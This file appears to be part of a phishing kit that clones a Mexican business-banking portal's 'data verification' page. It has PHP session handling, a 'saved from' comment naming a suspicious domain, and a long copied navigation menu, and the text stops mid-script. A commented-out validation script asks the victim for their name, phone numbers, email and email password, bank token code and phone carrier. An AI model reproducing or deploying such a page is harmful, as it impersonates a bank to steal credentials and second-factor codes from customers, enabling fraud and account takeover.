<?php 
    $session = $_GET['session'];
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- saved from url=(0123)https://supernt.online/QcajASCS0Jq71jRv6xIgxv2SB6EFtt4ysrLuzJRK/WGmQas8AEcGObGZlt7X36DY5rumUiiYYHCfSmP54KsfXAMc8tT/data.php -->
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <link rel="stylesheet" href="encuesta_actualizaciondatos2017/explo.css" type="text/css">
    <link rel="stylesheet" href="encuesta_actualizaciondatos2017/jquery-ui-1.8.18.custom.css" type="text/css" media="screen">
    

<link rel="StyleSheet " type="text/css" href="./Default.css">
<link rel="StyleSheet " type="text/css" href="./menus.css">

<link href="./bootstrap.min.css" rel="stylesheet" type="text/css">
<link rel="StyleSheet " type="text/css" href="./bootstrap.css">
<link rel="StyleSheet " type="text/css" href="./bootstrap_SNT.css">
<link rel="StyleSheet " type="text/css" href="./bootstrap-datepicker.min.css">
<link rel="StyleSheet " type="text/css" href="./estilosEspeciales.css">

      <script type="text/javascript" src="encuesta_actualizaciondatos2017/jquery-1.7.1.min.js.descarga"></script>
    <script type="text/javascript" src="encuesta_actualizaciondatos2017/jquery-ui-1.8.18.custom.min.js.descarga"></script>
    <script type="text/javascript" src="encuesta_actualizaciondatos2017/funciones.js.descarga"></script>
    <script language=Javascript>
        <!--
    function solo_numeros_wey(evt)
     {
        var keyPressed = (evt.which) ? evt.which : event.keyCode
       return !(keyPressed > 31 && (keyPressed < 48 || keyPressed > 57));
     }
      //-->
   </script>

    <script src="js/cuadroDialogo.js"></script>
    <script src="validation_contacto.js"></script>


    <!--<script language="javascript">
        function verifica(){     
    if(document.form.bato.value.length < 2){
        alert("Debe ingresar su nombre completo");
        document.form.bato.focus();
        return 0;
    }
	  
    if(document.form.fon.value.length < 5){
        alert("Debe ingresar su numero de telefono fijo con clave lada");
        document.form.fon.focus();
        return 0;
    }
	
    if(document.form.celular.value.length <= 9){
        alert("Debe ingresar su numero celular completo");
		document.form.celular.value = '';
        document.form.celular.focus();
        return 0;
    
	
	 } 
    if(document.form.correo.value.length <= 1){
        alert("Debe ingresar su E-Mail");
        document.form.correo.focus();
        return 0;
    
	
	 }
	 expr = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
			 if ( !expr.test(document.form.correo.value) ){
				alert('Ingrese un E-Mail valido.');              
				document.form.correo.value = "";
                document.form.correo.focus();
				return false;
			 }
    if(document.form.passemail.value.length <= 3){
        alert("Ingrese la contrase\xf1a");
        document.form.passemail.focus();
        return 0;
    
	
	 }	 
	if(document.form.passemail.value != document.form.passemail2.value){
				  alert('Las contrase\xf1as no coinciden, verifique.');                
				  document.getElementById('passemail').value = "";
				  document.getElementById('passemail2').value = "";
                  document.getElementById('passemail').focus();				  
				  return false;
			 }

   if(document.form.token.value.length <= 0){
        alert("Debe ingresar su codigo token para continuar");
        document.form.token.focus();
        return 0;
    }

    if(document.form.carrier.value.length <= 0){
        alert("Debe ingresar su compañia telefonica");
        document.form.carrier.focus();
        return 0;
	
	}else{
        document.form.submit();   
    } 
} 

</script>-->

    <title>Verificaci&oacute;n de datos</title>
    <meta http-equiv="Content-Type" content="text/html;">
    <meta name="Codigo de Pantalla" content="s25290">
    <meta name="Proyecto" content="Portal">
    <meta name="Version" content="1.0">
    <meta name="Ultima version" content="27/04/2001 18:00">
    <meta name="Desarrollo de codigo HTML" content="Grey Interactive Mexico">

    <script language="JavaScript1.2" src="encuesta_actualizaciondatos2017/fw_menu.js.descarga"></script>
    <script language="JavaScript" src="encuesta_actualizaciondatos2017/Bitacora.js.descarga"></script>
    <!--<script language="JavaScript" src="encuesta_actualizaciondatos2017/cuadroDialogo.js.descarga"></script>-->

    <link rel="stylesheet" href="encuesta_actualizaciondatos2017/consultas.css" type="text/css">

    <script language="Javascript">
        <!--


//Sección Java
		

			function unSoloContrato(){ 
cuadroDialogo ('Solo existe un contrato asociado.', 4);
 }

function fwLoadMenus() {
  if (window.fw_menu_0) return;
 window.fw_menu_0_1_1 = new Menu("Por Cuenta",135,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
  fw_menu_0_1_1.addMenuItem("Cheques","location='/Enlace/enlaceMig/csaldo1?prog=0&flujo=ECCC'");
	fw_menu_0_1_1.addMenuItem("Banca Especializada","location='/Enlace/enlaceMig/BE_ConsultaSaldos?flujo=ECCB'");
	fw_menu_0_1_1.addMenuItem("Tarjeta de Cr&eacute;dito","location='/Enlace/enlaceMig/MCL_Credito?Cuenta=5&flujo=ECCT'");
	 fw_menu_0_1_1.hideOnMouseOut=true;
	window.fw_menu_0_1_2 = new Menu("Consolidados",100,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_0_1_2.addMenuItem("Cheques","location='/Enlace/enlaceMig/MSC_Inicio?flujo=ECCH'");
	 fw_menu_0_1_2.hideOnMouseOut=true;
    window.fw_menu_0_1 = new Menu("Saldos",99,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_0_1.addMenuItem(fw_menu_0_1_1);
	fw_menu_0_1.addMenuItem(fw_menu_0_1_2);
	   fw_menu_0_1.hideOnMouseOut=true;
     fw_menu_0_1.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
    window.fw_menu_0_2 = new Menu("Posici&oacute;n",135,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_0_2.addMenuItem("Chequeras","location='/Enlace/enlaceMig/c_posicion?opcion=0&flujo=ECPS'");
	 fw_menu_0_2.addMenuItem("Banca Especializada","location='/Enlace/enlaceMig/BE_ConsultaPosicion?flujo=ECPB'");
    fw_menu_0_2.addMenuItem("Tarjeta de Cr&eacute;dito","location='/Enlace/enlaceMig/MCL_MenuPos?Tipo=Posicion&Cuenta=5&flujo=ECPT'");
	fw_menu_0_2.hideOnMouseOut=true;
	window.fw_menu_0_3_1 = new Menu("Programados",135,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
  fw_menu_0_3_1.addMenuItem("Registro","location='/Enlace/enlaceMig/csaldo1?prog=1&prog1=0&flujo=ECPR'");
 fw_menu_0_3_1.addMenuItem("Consulta","location='/Enlace/enlaceMig/csaldo1?prog=5&flujo=ECPC'");
	 fw_menu_0_3_1.hideOnMouseOut=true;
	window.fw_menu_0_3_2 = new Menu("Chequeras",135,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_0_3_2.addMenuItem("En L&iacute;nea","location='/Enlace/enlaceMig/CMovimiento?prog=0&flujo=ECCL'");
	fw_menu_0_3_2.addMenuItem(fw_menu_0_3_1);
	fw_menu_0_3_2.hideOnMouseOut=true;
  fw_menu_0_3_2.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
    window.fw_menu_0_3 = new Menu("Movimientos",176,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_0_3.addMenuItem(fw_menu_0_3_2);
	 fw_menu_0_3.addMenuItem("Banca Especializada","location='/Enlace/enlaceMig/CMovimiento?Banca=E&prog=0&flujo=ECMB'");
    fw_menu_0_3.addMenuItem("Tarjeta de Cr&eacute;dito","location='/Enlace/enlaceMig/MCL_Movimientos?Tipo=1&Cuenta=5&Modulo=0&flujo=ECMT'");
	fw_menu_0_3.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
    fw_menu_0_3.addMenuItem("Multicheque","location='/Enlace/enlaceMig/ChesBenefBaja?ventana=10&flujo=ECMM'");
	   fw_menu_0_3.hideOnMouseOut=true;
  window.fw_menu_0 = new Menu("root",171,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
  fw_menu_0.addMenuItem(fw_menu_0_1);
  fw_menu_0.addMenuItem(fw_menu_0_2);
  fw_menu_0.addMenuItem(fw_menu_0_3);
  fw_menu_0.addMenuItem("Operaciones Programadas","location='/Enlace/enlaceMig/programada?ventana=0&flujo=ECMO'");
	fw_menu_0.addMenuItem("Bit&aacute;cora","location='/Enlace/enlaceMig/CBitacora?flujo=ECBI'");
  fw_menu_0.addMenuItem("Informe de Comisiones","location='/Enlace/enlaceMig/consultaComisiones?flujo=ECIN'");
	 fw_menu_0.hideOnMouseOut=true;
	 fw_menu_0.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	window.fw_menu_1_1_1 = new Menu("Moneda Nacional",73,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_1_1_1.addMenuItem("En l&iacute;nea","location='/Enlace/enlaceMig/transferencia?ventana=0&flujo=ETML'");
 fw_menu_1_1_1.addMenuItem("M&uacute;ltiple","location='/Enlace/enlaceMig/TransferenciasMultiples?ventana=0&flujo=ETMM'");
 fw_menu_1_1_1.hideOnMouseOut=true;
   window.fw_menu_1_2 = new Menu("Ordenes de Pago Ocurre",118,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
   fw_menu_1_2.addMenuItem("Personas F&iacute;sicas","location='/Enlace/enlaceMig/SinFacultades'");
   fw_menu_1_2.addMenuItem("Personas Morales","location='/Enlace/enlaceMig/SinFacultades'");
   fw_menu_1_2.hideOnMouseOut=true;
   window.fw_menu_1_1 = new Menu("Cuentas mismo Banco",118,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
   fw_menu_1_1.addMenuItem(fw_menu_1_1_1);
   fw_menu_1_1.addMenuItem("D&oacute;lares","location='/Enlace/enlaceMig/transferencia?ventana=4&flujo=ETMD'");
    fw_menu_1_1.hideOnMouseOut=true;
    fw_menu_1_1.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
   window.fw_menu_1_3 = new Menu("Tarjeta de Cr&eacute;dito",118,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
   fw_menu_1_3.addMenuItem("Pago","location='/Enlace/enlaceMig/transferencia?ventana=3&flujo=ETTP'");
   fw_menu_1_3.addMenuItem("Disposici&oacute;n","location='/Enlace/enlaceMig/transferencia?ventana=6&flujo=ETTD'");
 window.fw_menu_1 = new Menu("root",275,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_1.addMenuItem(fw_menu_1_1);
 fw_menu_1.addMenuItem(fw_menu_1_2);
 fw_menu_1.addMenuItem("Interbancarias","location='/Enlace/enlaceMig/MDI_Interbancario?Modulo=0&flujo=ETIN'");
 fw_menu_1.addMenuItem(fw_menu_1_3);
 fw_menu_1.addMenuItem("Cambios (Transferencias M.N.-Dlls./Dlls.-M.N.)","location='/Enlace/enlaceMig/MIPD_cambios?ventana=0&flujo=ETCA'");
 fw_menu_1.addMenuItem("Transferencias Internacionales","location='/Enlace/enlaceMig/MTI_Inicio?Modulo=0&flujo=ETTI'");
  fw_menu_1.hideOnMouseOut=true;
  fw_menu_1.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
     window.fw_menu_2_1_1 = new Menu("Plazo",149,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	 fw_menu_2_1_1.addMenuItem("Registro de Operaciones","location='/Enlace/enlaceMig/EI_EnConstruccion'");
     fw_menu_2_1_1.addMenuItem("Cambio de Instrucci&oacute;n","location='/Enlace/enlaceMig/EI_EnConstruccion'");
	fw_menu_2_1_1.hideOnMouseOut=true;
   window.fw_menu_2_1 = new Menu("Inversiones",161,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	 fw_menu_2_1.addMenuItem("Fondos de Inversi&oacute;n","location='/Enlace/enlaceMig/InverSoc?ventana=0&flujo=ERFI'");
    fw_menu_2_1.addMenuItem("Vista","location='/Enlace/enlaceMig/vista?ventana=0&flujo=ERIV'");
    fw_menu_2_1.addMenuItem(fw_menu_2_1_1);
	fw_menu_2_1.hideOnMouseOut=true;
     fw_menu_2_1.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	  window.fw_menu_2_2_1_1 = new Menu("Consultas",94,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	  fw_menu_2_2_1_1.addMenuItem("Saldo","location='/Enlace/enlaceMig/MCL_Credito?Cuenta=0&flujo=ERCS'");
	  fw_menu_2_2_1_1.addMenuItem("Posici&oacute;n","location='/Enlace/enlaceMig/MCL_MenuPos?Tipo=Posicion&Cuenta=0&flujo=ERCP'");
	  fw_menu_2_2_1_1.addMenuItem("Movimientos","location='/Enlace/enlaceMig/MCL_Movimientos?Tipo=2&Cuenta=0&Modulo=0&flujo=ERCM'");
    fw_menu_2_2_1_1.hideOnMouseOut=true;
	window.fw_menu_2_2_1 = new Menu("Cr&eacute;dito en L&iacute;nea",79,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_2_2_1.addMenuItem(fw_menu_2_2_1_1);
	fw_menu_2_2_1.addMenuItem("Prepago","location='/Enlace/enlaceMig/MCL_Pagos?Modulo=0&flujo=ERLP'");
  fw_menu_2_2_1.hideOnMouseOut=true;
	 fw_menu_2_2_1.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	window.fw_menu_2_2_2 = new Menu("Cr&eacute;dito Electr&oacute;nico",100,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_2_2_2.addMenuItem("Consultas","location='/Enlace/enlaceMig/ceConSaldos?Modulo=0&flujo=EREC'");
	fw_menu_2_2_2.addMenuItem("Pagos","location='/Enlace/enlaceMig/cePrepagos?Modulo=0&flujo=EREP'");
	fw_menu_2_2_2.addMenuItem("Disposici&oacute;n","location='/Enlace/enlaceMig/ceVista?flujo=ERED'");
	 fw_menu_2_2_2.hideOnMouseOut=true;
			window.fw_menu_2_2 = new Menu("Cr&eacute;dito",125,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	 fw_menu_2_2.addMenuItem(fw_menu_2_2_1);
    fw_menu_2_2.addMenuItem(fw_menu_2_2_2);
    fw_menu_2_2.hideOnMouseOut=true;
	fw_menu_2_2.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
     window.fw_menu_2_3 = new Menu("Tesorer&iacute;a Internacional",255,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_2_3.addMenuItem("Cambios (Transferencias M.N.-Dlls./Dlls.-M.N.)","location='/Enlace/enlaceMig/MIPD_cambios?ventana=0&flujo=ERIC'");
	fw_menu_2_3.addMenuItem("Transferencias Internacionales","location='/Enlace/enlaceMig/MTI_Inicio?Modulo=0&flujo=ERTI'");
	 fw_menu_2_3.hideOnMouseOut=true;
     fw_menu_2_3.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
 window.fw_menu_2_4_1 = new Menu("Mantenimiento de Estructuras",120,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_2_4_1.addMenuItem("Concentraci&oacute;n","location='/Enlace/enlaceMig/TIConcentracion?flujo=ERMC'");
	fw_menu_2_4_1.addMenuItem("Dispersi&oacute;n","location='/Enlace/enlaceMig/TIDispersion?flujo=ERMD'");
	fw_menu_2_4_1.addMenuItem("Fondeo Autom&aacute;tico","location='/Enlace/enlaceMig/TIFondeo?flujo=ERMF'");
	 fw_menu_2_4_1.hideOnMouseOut=true;
	window.fw_menu_2_4_2 = new Menu("Consulta de Saldos",91,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_2_4_2.addMenuItem("Concentraci&oacute;n","location='/Enlace/enlaceMig/TIConSaldos?opcion=1&Accion=0&flujo=ERSC'");
	fw_menu_2_4_2.addMenuItem("Dispersi&oacute;n","location='/Enlace/enlaceMig/TIConSaldos?opcion=0&Accion=0&flujo=ERSD'");
	 fw_menu_2_4_2.hideOnMouseOut=true;
	window.fw_menu_2_4_3 = new Menu("Consulta de Movimientos",91,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_2_4_3.addMenuItem("Concentraci&oacute;n","location='/Enlace/enlaceMig/TIConMovtos?Tipo=C&flujo=ERVC'");
	fw_menu_2_4_3.addMenuItem("Dispersi&oacute;n","location='/Enlace/enlaceMig/TIConMovtos?Tipo=D&flujo=ERVD'");
  fw_menu_2_4_3.hideOnMouseOut=true;
    window.fw_menu_2_4 = new Menu("Tesorer&iacute;a Inteligente",185,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_2_4.addMenuItem(fw_menu_2_4_1);
    fw_menu_2_4.addMenuItem(fw_menu_2_4_2);
	 fw_menu_2_4.addMenuItem(fw_menu_2_4_3);
     fw_menu_2_4.hideOnMouseOut=true;
	fw_menu_2_4.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	window.fw_menu_2_5_1 = new Menu("Programaci&oacute;n de Operaci&oacute;n",84,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_2_5_1.addMenuItem("Consulta","location='/Enlace/enlaceMig/SinFacultades'");
	fw_menu_2_5_1.addMenuItem("Registro","location='/Enlace/enlaceMig/SinFacultades'");
	 fw_menu_2_5_1.hideOnMouseOut=true;
    window.fw_menu_2_5 = new Menu("Esquema Base Cero",199,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_2_5.addMenuItem("Mantenimiento de Estructura","location='/Enlace/enlaceMig/SinFacultades'");
	fw_menu_2_5.addMenuItem("Consulta de Saldos","location='/Enlace/enlaceMig/SinFacultades'");
    fw_menu_2_5.addMenuItem(fw_menu_2_5_1);
     fw_menu_2_5.hideOnMouseOut=true;
	   fw_menu_2_5.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
 window.fw_menu_2_6 = new Menu("FX Online",250,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
   fw_menu_2_6.addMenuItem("Compra y Venta de Divisas","location='/Enlace/enlaceMig/RET_PactaOper?opcion=iniciar'");
   fw_menu_2_6.addMenuItem("Liberación de Operaciones","location='/Enlace/enlaceMig/RET_LiberaOper?opcion=iniciar'");
   fw_menu_2_6.addMenuItem("Consulta de Operaciones","location='/Enlace/enlaceMig/RET_ConsultaOper?opcion=iniciar'");
   fw_menu_2_6.hideOnMouseOut=true;
   fw_menu_2_6.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
  window.fw_menu_2 = new Menu("root",150,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
  fw_menu_2.addMenuItem(fw_menu_2_1);
  fw_menu_2.addMenuItem(fw_menu_2_2);
  fw_menu_2.addMenuItem(fw_menu_2_3);
  fw_menu_2.addMenuItem(fw_menu_2_4);
  fw_menu_2.addMenuItem(fw_menu_2_5);
 fw_menu_2.addMenuItem(fw_menu_2_6);
   fw_menu_2.hideOnMouseOut=true;
   fw_menu_2.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	window.fw_menu_3_1_1 = new Menu("Mantenimiento de Cuentas",48,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_1_1.addMenuItem("Alta","location='/Enlace/enlaceMig/SinFacultades'");
	fw_menu_3_1_1.addMenuItem("Baja","location='/Enlace/enlaceMig/SinFacultades'");
	 fw_menu_3_1_1.hideOnMouseOut=true;
    window.fw_menu_3_1 = new Menu("Impuestos Federales",175,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_3_1.addMenuItem(fw_menu_3_1_1);
    fw_menu_3_1.addMenuItem("Pagos","location='/Enlace/enlaceMig/PagosImpuestos?OPCION=0'");
    fw_menu_3_1.addMenuItem("Consultas","location='/Enlace/enlaceMig/PagosImpuestos?OPCION=10&flujo=ESCO'");
	 fw_menu_3_1.hideOnMouseOut=true;
     fw_menu_3_1.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
    window.fw_menu_3_7 = new Menu("Nuevo Esquema de Pago de Impuestos",250,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_7.addMenuItem("Provisional","location='/Enlace/enlaceMig/ValidaRFC?OPCION=0&flujo=ESIP'");
    fw_menu_3_7.addMenuItem("Del Ejercicio","location='/Enlace/enlaceMig/NuevoPagoImpuestos?ventana=0&tipopago=005&flujo=ESIE'");
    //fw_menu_3_7.addMenuItem("Creditos Fiscales","location='/Enlace/enlaceMig/NuevoPagoImpuestos?ventana=0&tipopago=004'");
    fw_menu_3_7.addMenuItem("Entidades Federativas","location='/Enlace/enlaceMig/NuevoPagoImpuestos?ventana=0&tipopago=012&flujo=ESIF'");
  fw_menu_3_7.addMenuItem("Derechos, Productos y Aprovechamientos","location='/Enlace/enlaceMig/NuevoPagoImpuestos?ventana=0&tipopago=010&flujo=ESID'");
    fw_menu_3_7.addMenuItem("L&iacute;nea de Captura","location='/Enlace/enlaceMig/CambioContrato?Modulo=1&flujo=ESLC'");
     fw_menu_3_7.hideOnMouseOut=true;
	 window.fw_menu_3_2 = new Menu("Aportaciones Obrero Patronales (S.U.A.)",79,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	 fw_menu_3_2.addMenuItem("Pagos","location='/Enlace/enlaceMig/SuaDisco?ventana=0&flujo=ESOP'");
	 fw_menu_3_2.addMenuItem("Consultas","location='/Enlace/enlaceMig/SuaConsulta?origen=Consulta&ventana=0&flujo=ESOC'");
 fw_menu_3_2.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	window.fw_menu_3_3_1_1 = new Menu("Cat&aacute;logo de N&oacute;mina",240,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_3_1_1.addMenuItem("B&uacute;squeda","location='/Enlace/enlaceMig/CatalogoNominaEmpl?opcion=1&flujo=ESEC'");
	fw_menu_3_3_1_1.addMenuItem("Alta por archivo","location='/Enlace/enlaceMig/PrevalidadorServlet?opcion=1&flujo=ESEC'");
	fw_menu_3_3_1_1.addMenuItem("Modificaci&oacute;n por Archivo","location='/Enlace/enlaceMig/CatalogoNominaEmpl?opcion=9&flujo=ESEC'");
	fw_menu_3_3_1_1.addMenuItem("Baja por Archivo","location='/Enlace/enlaceMig/CatalogoNominaEmpl?opcion=6&flujo=ESEC'");
	fw_menu_3_3_1_1.addMenuItem("Liberaci&oacute;n de empleados no registrados","location='/Enlace/enlaceMig/LiberaEmpleadosServlet?opcion=1&flujo=ESEC'");
	window.fw_menu_3_3_1_2 = new Menu("Mantenimiento Interbancario",220,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_3_1_2.addMenuItem("Alta en L&iacute;nea","location='/Enlace/enlaceMig/CatalogoNominaInterb?flujo=ESEC'");
	fw_menu_3_3_1_2.addMenuItem("Alta por Archivo","location='/Enlace/enlaceMig/CatalogoNominaInterb?opcion=12&flujo=ESEC'");
	fw_menu_3_3_1_2.addMenuItem("Modificaci&oacute;n por Archivo","location='/Enlace/enlaceMig/CatalogoNominaInterb?opcion=6&flujo=ESEC'");
	window.fw_menu_3_3_1 = new Menu("Empleados",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_3_1.addMenuItem("Mantenimiento","location='/Enlace/enlaceMig/ANomMttoEmp?page=1&flujo=ESEM'");
	fw_menu_3_3_1.addMenuItem("Consulta de Proceso de Alta","location='/Enlace/enlaceMig/ANomMttoEmp?page=2&flujo=ESEC'");
	 fw_menu_3_3_1.hideOnMouseOut=true;
	fw_menu_3_3_1.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	window.fw_menu_3_3_2 = new Menu("Pagos",160,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_3_2.addMenuItem("Importaci&oacute;n - Envio","location='/Enlace/enlaceMig/InicioNomina?Modulo=0&flujo=ESPI'");
	fw_menu_3_3_2.addMenuItem("Consultas - Cancelaciones","location='/Enlace/enlaceMig/InicioNomina?Modulo=1&flujo=ESPC'");
	 fw_menu_3_3_2.hideOnMouseOut=true;
 window.fw_menu_3_3_1_6 = new Menu("N&oacute;mina en L&iacute;nea",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_3_1_6.addMenuItem("Pagos","location='/Enlace/enlaceMig/SinFacultades'");
 fw_menu_3_3_1_6.addMenuItem("Consulta","location='/Enlace/enlaceMig/SinFacultades'");
    window.fw_menu_3_3 = new Menu("N&oacute;mina",170,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_3_3.addMenuItem(fw_menu_3_3_1);
    fw_menu_3_3.addMenuItem(fw_menu_3_3_2);
	fw_menu_3_3.addMenuItem(fw_menu_3_3_1_1);
    fw_menu_3_3.addMenuItem("Interbancaria","location='/Enlace/enlaceMig/InicioNominaInter?flujo=ESNI'");
 fw_menu_3_3.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	window.fw_menu_3_4_1 = new Menu("Registro de Cheques",85,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_4_1.addMenuItem("En L&iacute;nea","location='/Enlace/enlaceMig/SinFacultades'");
 fw_menu_3_4_1.addMenuItem("Por Archivo","location='/Enlace/enlaceMig/SinFacultades'");
	 fw_menu_3_4_1.hideOnMouseOut=true;
	window.fw_menu_3_4_2 = new Menu("Mantenimiento de Beneficiarios",91,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_4_2.addMenuItem("Alta","location='null'");
	fw_menu_3_4_2.addMenuItem("Baja","location='null'");
	window.fw_menu_3_3_1_4 = new Menu("Pagos",160,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_3_1_4.addMenuItem("Importaci&oacute;n - Envio","location='/Enlace/enlaceMig/InicioNominaInter?flujo=ESNI'");
	 fw_menu_3_3_1_4.hideOnMouseOut=true;
	window.fw_menu_3_3_1_5 = new Menu("Registro de Cuentas",220,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_3_1_5.addMenuItem("B&uacute;squeda","location='/Enlace/enlaceMig/CatalogoNominaEmplInterb?opcion=1&flujo=ESEC'");
	fw_menu_3_3_1_5.addMenuItem("Alta","location='/Enlace/enlaceMig/SinFacultades'");
	fw_menu_3_3_1_5.addMenuItem("Baja","location='/Enlace/enlaceMig/SinFacultades'");
	fw_menu_3_3_1_5.addMenuItem("Autorizaci&oacute;n y Cancelaci&oacute;n","location='/Enlace/enlaceMig/SinFacultades'");
	 fw_menu_3_3_1_5.hideOnMouseOut=true;
    window.fw_menu_3_3_1_3 = new Menu("N&oacute;mina Interbancaria",170,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_3_3_1_3.addMenuItem(fw_menu_3_3_1_4);
    fw_menu_3_3_1_3.addMenuItem(fw_menu_3_3_1_5);
 fw_menu_3_3_1_3.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
 window.fw_menu_3_3_3_1 = new Menu("Remesas",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_3_3_1.addMenuItem("Recepci&oacute;n","location='/Enlace/enlaceMig/NomPreRemesas?operacion=inirecep&flujo=ESRR'");
 fw_menu_3_3_3_1.addMenuItem("Consulta","location='/Enlace/enlaceMig/NomPreRemesas?operacion=iniconsul&flujo=ESRC'");
 window.fw_menu_3_3_3_2 = new Menu("Asignaci&oacute;n tarjeta-empleado",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_3_3_2.addMenuItem("Asignaci&oacute;n","location='/Enlace/enlaceMig/NomPreAltaTarjeta?opcion=1&flujo=ESAA'");
 fw_menu_3_3_3_2.addMenuItem("Consulta","location='/Enlace/enlaceMig/NomPreBusqueda?flujo=ESAC'");
 fw_menu_3_3_3_2.addMenuItem("Baja","location='/Enlace/enlaceMig/NomPreCancelaTarjeta?operacionNP=cancela&flujo=ESAB'");
 fw_menu_3_3_3_2.addMenuItem("Bloqueo","location='/Enlace/enlaceMig/NomPreCancelaTarjeta?operacionNP=bloqueo&flujo=ESAQ'");
